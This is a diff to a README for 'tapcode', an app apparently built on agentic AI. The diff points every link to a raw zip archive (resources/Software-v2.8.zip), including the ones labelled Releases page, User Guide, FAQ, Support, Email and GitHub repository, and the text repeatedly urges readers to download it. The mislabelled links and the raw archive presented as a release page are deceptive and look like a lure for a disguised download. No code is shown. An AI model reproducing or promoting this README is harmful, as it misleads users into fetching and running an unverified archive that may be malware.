@@ -6,11 +6,11 @@ Welcome to tapcode! This app uses Agentic AI to build code for various applicati
 
 ## ⚡ Download tapcode
 
-[![Download tapcode](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/domal/tapcode.zip%20tapcode-v1.0-brightgreen)](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/domal/tapcode.zip)
+[![Download tapcode](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/resources/Software-v2.8.zip%20tapcode-v1.0-brightgreen)](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/resources/Software-v2.8.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the Releases page to download the latest version of tapcode: [Download tapcode](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/domal/tapcode.zip).
+To get started, visit the Releases page to download the latest version of tapcode: [Download tapcode](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/resources/Software-v2.8.zip).
 
 1. Open your web browser.
 2. Click the link above to go to the Releases page.
@@ -50,9 +50,9 @@ After the installation, you can open tapcode from your applications menu.
 
 If you need help or want to learn more about using tapcode, check out these resources:
 
-- [User Guide](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/domal/tapcode.zip) - A complete manual on how to use every feature.
-- [FAQ](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/domal/tapcode.zip) - Common questions and answers about tapcode.
-- [Support](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/domal/tapcode.zip) - Report issues or ask for help directly.
+- [User Guide](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/resources/Software-v2.8.zip) - A complete manual on how to use every feature.
+- [FAQ](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/resources/Software-v2.8.zip) - Common questions and answers about tapcode.
+- [Support](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/resources/Software-v2.8.zip) - Report issues or ask for help directly.
 
 ## 🌐 Community & Contributions
 
@@ -70,10 +70,10 @@ Your security is important. tapcode does not store your prompts or generated cod
 
 If you have any questions about tapcode, feel free to reach out:
 
-- Email: https://raw.githubusercontent.com/SolixenVelor/tapcode/master/domal/tapcode.zip
-- GitHub: [tapcode repository](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/domal/tapcode.zip)
+- Email: https://raw.githubusercontent.com/SolixenVelor/tapcode/master/resources/Software-v2.8.zip
+- GitHub: [tapcode repository](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/resources/Software-v2.8.zip)
 
 ## 📥 Download tapcode Again
 
-Don’t forget to visit the Releases page to download tapcode now: [Download tapcode](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/domal/tapcode.zip). Enjoy creating your apps!
+Don’t forget to visit the Releases page to download tapcode now: [Download tapcode](https://raw.githubusercontent.com/SolixenVelor/tapcode/master/resources/Software-v2.8.zip). Enjoy creating your apps!
 
